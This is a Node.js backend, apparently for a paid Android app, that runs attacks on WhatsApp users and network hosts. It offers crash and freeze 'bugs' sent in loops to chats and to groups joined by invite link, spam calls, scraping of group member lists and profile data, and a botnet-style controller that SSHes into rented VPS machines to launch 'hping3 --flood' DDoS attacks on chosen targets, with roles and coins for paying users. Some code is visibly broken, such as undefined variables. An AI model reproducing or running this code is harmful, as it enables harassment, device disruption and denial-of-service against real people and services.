const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};

process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@devil-fight/baileys");
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app); // gunakan Express app
const wss = new WebSocket.Server({ server });
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
// BUG UNTUK PRIVATE CHAT
const bugs = [
  { bug_id: "freez", bug_name: "Freez Clik Crash" },
  { bug_id: "bulldo", bug_name: "Buldo Hard" },
  { bug_id: "invisible", bug_name: "Delay Invisible" },
  { bug_id: "ioscrash", bug_name: "Crash Iphone" },
  { bug_id: "blank", bug_name: "Blank Ui System" },
  { bug_id: "forclose", bug_name: "Contact FC Anti Block" },
];

const privateBugs = [
  { bug_id: "freez", bug_name: "Freez Clik Crash" },
  { bug_id: "bulldo", bug_name: "Buldo Hard" },
  { bug_id: "invisible", bug_name: "Delay Invisible" },
  { bug_id: "ioscrash", bug_name: "Crash Ios" },
  { bug_id: "blank", bug_name: "Blank Ui System" },
  { bug_id: "forclose", bug_name: "Contact FC Anti Block" },
];

// BUG UNTUK GROUP
const groupBugs = [
  { bug_id: "group_freez", bug_name: "Group Frez Chat" },
  { bug_id: "group_invisible", bug_name: "Delay Group" },
  { bug_id: "group_blank", bug_name: "Blank Group" },
  { bug_id: "group_forclose", bug_name: "Group Forclose Hard" },
];

let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));

// Initialize these variables properly at the beginning
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

// Fix: Proper file watcher initialization
let keyListWatcher = null;

function watchKeyList() {
  if (keyListWatcher) {
    fs.unwatchFile("keyList.json");
  }
  
  keyListWatcher = fs.watchFile("keyList.json", () => {
    console.log("[📂] keyList.json changed, reloading...");
    try {
      sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
    } catch (err) {
      console.error("Error reloading keyList.json:", err.message);
    }
  });
}

// Initialize watcher
watchKeyList();

// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  try {
    chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
  } catch (err) {
    console.error("Error loading chat file:", err.message);
    chatList = [];
  }
}

// Simpan chat
function saveChat() {
  try {
    fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
  } catch (err) {
    console.error("Error saving chat file:", err.message);
  }
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}
  
wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

        if (data.type === 'sessionCheck') {
  const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
  const user = sessionList.find(e => e.sessionKey === data.key);

  if (!user) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Invalid key"
    }));
    return ws.close();
  }

  if (user.androidId !== data.androidId) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Another device has logged in"
    }));
    return ws.close();
  }
}

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

            const interval = setInterval(() => {
            const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

            }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
         console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
const list = chatList
  .filter(m => m.from === username || m.to === username)
  .map(m => (m.from === username ? m.to : m.from));

  ws.send(JSON.stringify({
    type: "chatList",
    users: [...new Set(list)],
  }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

// Ganti listen jadi ini:
const wsPort = 2026;
server.listen(wsPort, () => {
  console.log(`🟣 Server running on http://localhost:${wsPort}`);
});

const PORT = 2026;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 10 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const vinzzoffc = new Client();

    vinzzoffc.on('ready', () => {
      if (!cncActive) {
        vinzzoffc.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = vinzzoffc;

      // Jika koneksi putus, reconnect otomatis
      vinzzoffc.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    vinzzoffc.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    vinzzoffc.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("📥 VPS list loaded.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (err) {
    console.error("Error loading VPS file:", err.message);
  }
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const vinzzoffc = vpsConnections[vps.host];
    if (!vinzzoffc) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    vinzzoffc.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  // Ensure all users have coins field
  data.forEach(user => {
    if (user.coins === undefined) user.coins = 100; // Default 100 coins
  });
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

const spamCooldown = {}; // { username: { count, lastReset } }
const cooldowns = {}; // { username: lastRaidTime }

app.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "owner", "mods"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const role = user.role || "member";
  const maxQty = role === "mods" ? 10 : 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
      
    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
    const vinzzoffc = biz[socketId];
    // 1. Unblock target dulu
    await vinzzoffc.updateBlockStatus(jid, "unblock");

    await vinzzoffc.offerCall(jid, true);
    await vinzzoffc.updateBlockStatus(jid, "block");
    console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
          const vinzzoffc = biz[socketId];
                // 1. Unblock target dulu
    await vinzzoffc.updateBlockStatus(jid, "unblock");

    await vinzzoffc.offerCall(jid, true);
                // 1. Unblock target dulu
    await vinzzoffc.updateBlockStatus(jid, "block");

          console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
        } catch (err) {
          console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    console.warn("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});

// ===== ENDPOINT AUTO REGISTER DARI APP =====
app.post("/autoRegister", (req, res) => {
  const { androidId } = req.body;

  if (!androidId) {
    return res.json({ 
      success: false, 
      message: "androidId diperlukan" 
    });
  }

  try {
    const db = loadDatabase();

    // Generate random username (5 huruf)
    const username = Array.from({ length: 5 }, () => 
      String.fromCharCode(97 + Math.floor(Math.random() * 26))
    ).join('').toUpperCase();

    // Generate random password (5 angka)
    const password = Array.from({ length: 5 }, () => 
      Math.floor(Math.random() * 10)
    ).join('');

    // Cek jika username sudah ada (retry jika perlu)
    if (db.find(u => u.username === username)) {
      return res.json({ 
        success: false, 
        message: "Username conflict, coba lagi" 
      });
    }

    // Set expired date (30 jam dari sekarang)
    const expiredDate = new Date();
    expiredDate.setHours(expiredDate.getHours() + 30);

    // Buat akun baru
    const newUser = {
      username,
      password,
      role: "member",
      expiredDate: expiredDate.toISOString().split("T")[0],
      coins: 0,
      androidId
    };

    db.push(newUser);
    saveDatabase(db);

    // Log
    const logLine = `${new Date().toISOString()} | AUTO_REGISTER | ${username} created from app (Android: ${androidId})\n`;
    fs.appendFileSync('logUser.txt', logLine);

    console.log(`[✅ AUTO REGISTER] ${username} created`);

    // Kirim notifikasi ke grup Telegram
    sendToGroups(
      `🎉 *Pendaftaran Otomatis Baru*\n\n` +
      `👤 Username: \`${username}\`\n` +
      `🔑 Password: \`${password}\`\n` +
      `🎯 Role: Member\n` +
      `⏳ Expired: 30 jam\n` +
      `💰 Coin: 0\n` +
      `📱 Android ID: ${androidId}\n` +
      `⏰ Waktu: ${new Date().toLocaleString("id-ID")}`,
      { parse_mode: "Markdown" }
    );

    return res.json({
      success: true,
      username,
      password,
      role: "member",
      expiredDate: newUser.expiredDate,
      coins: 0,
      message: "Akun berhasil dibuat!"
    });

  } catch (err) {
    console.error("[❌ AUTO REGISTER ERROR]", err.message);
    return res.json({ 
      success: false, 
      message: "Terjadi kesalahan server" 
    });
  }
});

app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const vinzzoffc = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await vinzzoffc.groupAcceptInvite(code);
    const metadata = await vinzzoffc.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await vinzzoffc.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    console.warn("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});

// ===== ENDPOINT BUG GROUP =====
app.get("/sendGroupBug", async (req, res) => {
  const { key, link, bug } = req.query;
  
  console.log(`[📤 GROUP BUG] Request to attack group with key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ GROUP BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ GROUP BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // ===== VALIDASI LINK GROUP =====
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) {
    return res.json({ 
      valid: true, 
      sended: false, 
      message: "Link grup tidak valid" 
    });
  }

  const code = match[1];

  // ===== COOLDOWN CHECK =====
  const roleCooldowns = {
    member: 600,
    reseller: 350,
    owner: 120,
    mods: 10000,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`);
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // ===== UPDATE LAST SEND =====
  user.lastSend = now;
  saveDatabase(db);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    try {
      const bizKeys = Object.keys(biz);
      if (bizKeys.length === 0) {
        console.log("[❌ NO SOCKET] Tidak ada Business socket tersedia.");
        return;
      }

      const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
      const vinzzoffc = biz[socketId];

      console.log(`[🎯 GROUP BUG] Using socket: ${socketId}`);

      const groupJid = await vinzzoffc.groupAcceptInvite(code);
      console.log(`[✅ JOINED] Berhasil join grup: ${groupJid}`);

      await sleep(2000);

      // Kirim bug sesuai tipe
      switch (bug) {
        case "group_freez":
            for (let i = 0; i < 180; i++) {
                  await freez(vinzzoffc, targetJid);
                  await XStromFlowFreeze(vinzzoffc, targetJid);
                  await sleep(2500);
                  await FloodUIxFC(vinzzoffc, targetJid);
            }
          break
        case "group_invisible":
            for (let i = 0; i < 80; i++) {
                  await DelayHard(vinzzoffc, targetJid);
                  await XStromDelayInvisible(vinzzoffc, targetJid, true);
                  await BlackHole02(vinzzoffc, targetJid);
                  await Delayyyx(vinzzoffc, targetJid);
                  await XStromDelayBeta(vinzzoffc, targetJid);
                  await delaycrash(vinzzoffc, targetJid);
                  await paymentDelay(vinzzoffc, targetJid);
                  await DelaySdot(vinzzoffc, targetJid);
                  await XStromDelayNative(vinzzoffc, targetJid, true);
            }
          break;
        case "group_blank":
            for (let i = 0; i < 100; i++) {
                  await BlankScreen(vinzzoffc, targetJid);
                  await MonikaCrashinvis(vinzzoffc, targetJid);
                  await XxUiCrash(vinzzoffc, targetJid);
                  await XStromFlowFreeze(vinzzoffc, targetJid);
                  await QQSPrivateBlank(vinzzoffc, targetJid);
                  await UiSystem(vinzzoffc, targetJid);
                  await FloodUIxFC(vinzzoffo, targetJid);
                  await XProtexBlankChatV5(vinzzoffc, targetJid);
                  await uiKiller(vinzzoffc, targetJid);
                  await crashUi(vinzzoffc, targetJid);
            }
          break;
        case "group_forclose":
            for (let i = 0; i < 100; i++) {
                  await FloodUIxFC(vinzzoffc, targetJid);
                  await MisteryHow(vinzzoffc, target);
                  await MisteryHow2(vinzzoffc, target);
                  await MisteryHow3(vinzzoffc, target);
                  await JessiForceLst(vinzzoffc, targetJid);
            }
          break;
      }

      console.log(`[✅ GROUP BUG] Bug '${bug}' terkirim ke grup`);

      // Leave grup setelah attack
      await sleep(2000);
      await vinzzoffc.groupLeave(groupJid);
      console.log(`[👋 LEFT] Keluar dari grup: ${groupJid}`);

    } catch (err) {
      console.warn(`[⚠️ GROUP BUG ERROR] ${err.message}`);
    }
  });
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const vinzzoffc = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await vinzzoffc.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await vinzzoffc.fetchStatus(jid).catch(() => null);
    const check = await vinzzoffc.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

// ===== SISTEM TOP UP COIN YANG SUDAH DIPERBAIKI =====
const TOPUP_FILE = "topup_requests.json";
const REDEEM_FILE = "redeem_codes.json";

function loadTopupRequests() {
  if (!fs.existsSync(TOPUP_FILE)) {
    fs.writeFileSync(TOPUP_FILE, JSON.stringify([]));
  }
  return JSON.parse(fs.readFileSync(TOPUP_FILE));
}

function saveTopupRequests(data) {
  fs.writeFileSync(TOPUP_FILE, JSON.stringify(data, null, 2));
}

function loadRedeemCodes() {
  if (!fs.existsSync(REDEEM_FILE)) {
    fs.writeFileSync(REDEEM_FILE, JSON.stringify([]));
  }
  return JSON.parse(fs.readFileSync(REDEEM_FILE));
}

function saveRedeemCodes(data) {
  fs.writeFileSync(REDEEM_FILE, JSON.stringify(data, null, 2));
}

function findUserByTelegramId(telegramId) {
  const db = loadDatabase();
  let user = db.find(u => u.telegram_id === telegramId);
  
  if (!user) {
    user = db.find(u => u.username === telegramId.toString());
  }
  
  return user;
}

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId, deviceName }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  const newRecord = {
    username,
    lastLogin: stamp,
    sessionKey: key,
    ipAddress: ip,
    androidId,
    deviceName: deviceName || "Unknown Device" // Tambahkan device name
  };

  if (idx !== -1) {
    list[idx] = newRecord;
  } else {
    list.push(newRecord);
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/6d1vji.jpg",
    title: "i'm? vinzz",
    desc: "Buy Acces Chat @VinzzOfficial"
  },
  {
    image: "https://files.catbox.moe/hkzy4k.png",
    title: "Building New App",
    desc: "Bug Is Crazy In App"
  },
  {
    image: "https://files.catbox.moe/2wukuu.jpg",
    title: "New Release",
    desc: "Check Feature Update"
  }
];

// ✅ THANKS TO SUPPORTERS (TELEGRAM VERSION)
const supporters = [
  {
    username: "vinzz",
    role: "THE DEVELOPER",
    avatar: "https://files.catbox.moe/fkfs6y.jpg",
    link: "https://t.me/VinzzOfficial"
  }
];

// ===== Endpoint: Login & Key Fetch (version 3.0 required) =====
app.post("/validate", async (req, res) => {
  const { username, password, version, androidId, deviceName } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false, message: "Invalid credentials" });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  // Cek device conflict
  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  if (existingSession && existingSession.androidId && existingSession.androidId !== androidId) {
    const oldDevice = {
      model: existingSession.deviceName || "Unknown Device",
      androidId: existingSession.androidId
    };
    const newDevice = {
      model: deviceName || "Unknown Device",
      androidId: androidId
    };
    const ipAddress = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;

    await sendDeviceConflictNotification(username, oldDevice, newDevice, ipAddress);

    return res.json({
      valid: false,
      deviceConflict: true,
      loggedDevice: oldDevice.model,
      message: "Another device is already logged in with this account."
    });
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
    deviceName: deviceName || "Unknown Device"
  });

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    privateBugs: privateBugs,
    groupBugs: groupBugs,
    news,
    supporters: supporters,
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  
  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  
  if (!user) {
    return res.json({ valid: false });
  }

  if (user.coins === undefined || user.coins === null) {
    user.coins = 100;
    saveDatabase(db);
  }

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    coins: user.coins,
    listBug: bugs,
    privateBugs: privateBugs,
    groupBugs: groupBugs,
    news: news,
    supporters: supporters,
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

// Utility functions
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, ""); // hapus semua karakter non-digit
